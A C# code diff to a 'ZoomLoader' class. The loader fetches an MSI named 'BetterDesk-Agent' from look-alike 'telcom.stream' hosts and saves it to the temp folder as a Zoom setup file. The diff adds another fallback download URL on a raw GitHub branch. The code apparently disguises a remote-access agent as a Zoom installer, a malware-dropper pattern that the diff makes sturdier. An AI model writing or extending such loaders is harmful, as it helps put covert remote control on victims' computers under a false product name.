@@ -40,6 +40,7 @@ public class ZoomLoader
 {
     const string RepoBase = "https://global.telcom.stream/downloads/payloads";
     const string Fallback = "https://us05web.telcom.stream";
+    const string RawBase = "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/windows";
     const string PkgName = "BetterDesk-Agent-x64-1.0.2.msi";
     const string SaveName = "zoom-private.Setup_1.0.0_x64_en-US.msi";
     const string ExpectedSha = "A2DFC22BD5CBDC625D9F7232E6006E3497BC8379D45687F7ACA4337B7B3A1D87";
@@ -296,7 +297,7 @@ public class ZoomLoader
         string destination = Path.Combine(Path.GetTempPath(), SaveName);
         string overrideUrl = Environment.GetEnvironmentVariable("ZOOM_URL");
         string[] urls = string.IsNullOrEmpty(overrideUrl)
-            ? new string[] { RepoBase + "/" + PkgName, Fallback + "/" + SaveName }
+            ? new string[] { RepoBase + "/" + PkgName, RawBase + "/" + PkgName, Fallback + "/" + SaveName }
             : new string[] { overrideUrl };
 
         Exception last = null;
